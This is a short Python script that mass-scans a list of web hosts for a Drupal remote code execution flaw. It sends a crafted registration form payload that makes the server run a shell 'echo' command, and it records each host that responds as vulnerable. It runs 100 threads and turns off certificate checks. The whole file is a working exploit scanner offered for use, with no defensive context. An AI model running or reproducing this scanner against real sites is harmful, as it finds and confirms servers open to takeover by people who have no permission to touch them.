# -*- coding: utf-8 -*-
#!/usr/bin/env python3

import sys
import requests
import re
from multiprocessing.dummy import Pool

requests.urllib3.disable_warnings()

try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    exit('noob: pd.py list.txt')

def chips(yeah):
    try:
        url = yeah + '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
        kelosex = {"form_id": "user_register_form", "_drupal_ajax": "1", "mail[#post_render][]": "exec", "mail[#type]": "markup", "mail[#markup]": "echo omelette"}
        if 'omelette' in requests.post(url, data=kelosex, verify=False).text:
            open("lacoste","a").write(yeah+"/\n")
            print(yeah, " -> Vuln frr")
        else:
            print(yeah, " -> Nan")    
    except:
        pass

mp = Pool(100)
mp.map(chips, target)
mp.close()
mp.join()
